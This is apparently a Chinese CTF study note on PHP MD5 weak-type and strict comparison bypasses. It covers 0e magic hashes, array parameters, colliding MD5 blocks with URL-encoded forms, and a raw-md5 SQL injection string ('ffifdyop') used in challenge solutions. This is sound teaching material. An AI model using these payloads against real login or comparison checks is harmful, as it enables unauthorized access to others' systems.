## MD5弱类型比较和强碰撞

`md5 ( string $string , bool $binary = false ) : string`

- `string`

	要计算的字符串

- `binary`

	如果可选的 `binary` 被设置为 **`true`**,那么 md5 摘要将以 16 字符长度的**原始二进制格式**返回

### 基本知识

php中有两种比较的符号`==`与`===`

`==`在进行比较的时候,会把两端变量类型转换成相同的,再进行比较(一个字符串与一个数字相比较时,字符串会转换成数值)

`===`在进行比较的时候,会先判断两种字符串的类型是否相等,再进行比较

```php
<?php
$a=1;
$b="a1";
$c="1a";
var_dump($a==$b);
var_dump($a==$c);
var_dump($a===$b);
var_dump($a===$c);
?>
```

```
bool(false)
bool(true)
bool(false)
bool(false)
```

`0e`开头且都是数字的字符串,**弱类型比较**都等于0

```php
<?php
var_dump(0=='1a');
var_dump(0=='a1');
var_dump(0==0e1);
var_dump(0=="0e1");
var_dump(0===0e1);
var_dump(0==="0e1");
?>
```

```
bool(false)
bool(true)
bool(true)
bool(true)
bool(false)
bool(false)
```

字符串转数值时,调用了`intval()`取整函数,而这个函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错,而是返回0

```php
<?php
var_dump(intval(4));
var_dump(intval("10asd"));
var_dump(intval("asd10"));
var_dump(intval(1.23));
?>
```

```
int(4)
int(10)
int(0)
int(1)
```

### 经典md5弱类型比较

```php
<?php
if(isset($_POST['a']) and isset($_POST['b'])){
    if($_POST['a']!=$_POST['b']){
        if(md5($_POST['a'])==md5($_POST['b'])){
            var_dump($_POST['a']);
            var_dump($_POST['b']);
            var_dump(md5($_POST['a']));
            var_dump(md5($_POST['b']));
            echo 'flag';
        }
    }
}
?>
```

1. md5不能加密数组,在加密数组的时候会返回`NULL`,因此POST传参`a[]=1&b[]=2`

```
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 4

Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 4
array(1) { [0]=> string(1) "1" } array(1) { [0]=> string(1) "2" }
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 7
NULL
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 8
NULL flag
```

2. md5进行的是弱类型比较,如果两个md5之后的结果均为`0e`开头的字符串则会被判断为相等

```python
import hashlib
import re

for i in range(1000000000):
    a = hashlib.md5(str(i).encode("utf-8")).hexdigest()
    if re.match('^0e\d+$', a) is not None:
        print(i, a)

```

```
240610708 0e462097431906509019562988736854
314282422 0e990995504821699494520356953734
```

`md5(0e215962017)=0e291242476940776845150308577824`

POST传参`a=240610708&b=314282422`

```
string(9) "240610708" string(9) "314282422" string(32) "0e462097431906509019562988736854" string(32) "0e990995504821699494520356953734" flag
```

### md5强类型比较

```php
<?php
if(isset($_POST['a']) and isset($_POST['b'])){
    if($_POST['a']!=$_POST['b']){
        if(md5($_POST['a'])===md5($_POST['b'])){
            var_dump($_POST['a']);
            var_dump($_POST['b']);
            var_dump(md5($_POST['a']));
            var_dump(md5($_POST['b']));
            echo 'flag';
        }
    }
}
?>
```

1. 仍然使用数组进行传参

2. 传递两个md5相同的文件,使用Burpsuite的Paste From File功能或者使用URL编码进行上传

```md5a
4D C9 68 FF 0E E3 5C 20 95 72 D4 77 7B 72 15 87
D3 6F A7 B2 1B DC 56 B7 4A 3D C0 78 3E 7B 95 18
AF BF A2 00 A8 28 4B F3 6E 8E 4B 55 B3 5F 42 75
93 D8 49 67 6D A0 D1 55 5D 83 60 FB 5F 07 FE A2
```

`%4D%C9%68%FF%0E%E3%5C%20%95%72%D4%77%7B%72%15%87%D3%6F%A7%B2%1B%DC%56%B7%4A%3D%C0%78%3E%7B%95%18%AF%BF%A2%00%A8%28%4B%F3%6E%8E%4B%55%B3%5F%42%75%93%D8%49%67%6D%A0%D1%55%5D%83%60%FB%5F%07%FE%A2`

```md5b
4D C9 68 FF 0E E3 5C 20 95 72 D4 77 7B 72 15 87
D3 6F A7 B2 1B DC 56 B7 4A 3D C0 78 3E 7B 95 18
AF BF A2 02 A8 28 4B F3 6E 8E 4B 55 B3 5F 42 75
93 D8 49 67 6D A0 D1 D5 5D 83 60 FB 5F 07 FE A2
```

`%4D%C9%68%FF%0E%E3%5C%20%95%72%D4%77%7B%72%15%87%D3%6F%A7%B2%1B%DC%56%B7%4A%3D%C0%78%3E%7B%95%18%AF%BF%A2%02%A8%28%4B%F3%6E%8E%4B%55%B3%5F%42%75%93%D8%49%67%6D%A0%D1%D5%5D%83%60%FB%5F%07%FE%A2`

```
 ~/桌面 md5sum md5* 
008ee33a9d58b51cfeb425b0959121c9  md5a
008ee33a9d58b51cfeb425b0959121c9  md5b
 ~/桌面 sha1sum md5*
c6b384c4968b28812b676b49d40c09f8af4ed4cc  md5a
c728d8d93091e9c7b87b43d9e33829379231d7ca  md5b
```

![image-20210409205849825](image-20210409205849825.png)

### 例题

```php
<?php 
error_reporting(0);
highlight_file(__file__);
$string_1 = $_GET['str1']; 
$string_2 = $_GET['str2']; 


if($_GET['param1']!==$_GET['param2']&&md5($_GET['param1'])===md5($_GET['param2'])){
        if(is_numeric($string_1)){ //用于检测变量是否为数字或数字字符串
            $md5_1 = md5($string_1); 
            $md5_2 = md5($string_2); 
            if($md5_1 != $md5_2){ 
                $a = strtr($md5_1, 'cxhp', '0123'); //其中一个md5之后的结果为ce开头
                $b = strtr($md5_2, 'cxhp', '0123'); 
                if($a == $b){
                    echo "flag";
                }
            }  
            else {
               die("md5 is wrong"); 
            }
            } 
        else {
            die('str1 not number'); 
        }
    }

?>
```

```python
import hashlib
import re

for i in range(1000000000):
    a = hashlib.md5(str(i).encode("utf-8")).hexdigest()
    if re.match('^ce\d+$', a) is not None:
        print(i, a)
```

`586180707 ce180897218118078483942647122685`

`param1[]=1&param2[]=2&str1=586180707&str2=240610708`

---

```php
<?php
error_reporting(0);
highlight_file(__file__);
function random() { 
    $a = rand(133,600)*78;
    $b = rand(18,195);
    return $a+$b;
}
$r = random();
    if((string)$_GET['a']==(string)md5($_GET['b'])){
        if($_GET['a'].$r == md5($_GET['b'])) {
            print "Yes,you are right";
        }
        else {
            print "you are wrong";
        }
    }

?>
```

`a=0e1&b=240610708`

---

> [BJDCTF2020]Easy MD5

在响应头中存在`Hint: select * from 'admin' where password=md5($pass,true)`

如果可以构造出一个md5,使得结果中包含`'or'`的字符串即可达成目的

md5`129581926211651571912466741651878684928`得到`\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8`

md5`ffifdyop`得到`'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`

传入`ffifdyop`即可进入下一关

`($a != $b && md5($a) == md5($b))`,传两个数组,即可进入下一关

`if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2']))`传两个md5相同的文件即可getflag